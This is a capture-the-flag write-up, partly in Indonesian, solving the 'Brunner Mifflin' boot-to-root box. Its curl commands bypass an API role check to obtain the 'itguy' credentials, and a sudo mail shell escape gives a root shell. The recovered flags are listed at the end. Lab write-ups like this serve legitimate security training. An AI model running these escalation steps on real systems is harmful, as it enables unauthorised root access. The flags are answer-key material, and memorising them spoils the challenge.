# Brunner Mifflin — user/root

- **Category:** Boot2Root
- **Status:** FULL TRANSCRIPT EXTRACTED

## Ringkasan
API enumeration mengarah ke role bypass, memperoleh kredensial itguy, lalu privilege escalation via sudo mail menuju root shell.

## Metode
API enumeration → role endpoint bypass → terminal login → sudo -l → mail shell escape.

## Command / primitive
```bash
curl -ks -i <TARGET>/api/User/{id}
curl -ks -i <TARGET>/api/User/Admin/itguy
curl -ks -i <TARGET>/api/Terminal/Login --data '{"username":"itguy","password":"itguy321"}'
sudo -l
sudo /usr/bin/mail -E 'shell /bin/bash'
grep -RhoE 'brunner\{[^}]+\}' /root /home /app /opt 2>/dev/null
```

## Rumus / constraint
```text
API role bypass → shell as itguy → sudo mail → root
```

## Solver / code snippet
```bash
# Privilege escalation
sudo -l
sudo /usr/bin/mail -E 'shell /bin/bash'
id
```

## Hasil
```text
User: brunner{1tGuyW111F1x}
Root: brunner{1tguy_t4k35_m41l_s3cur1ty_v3ry_53r10u5}
```
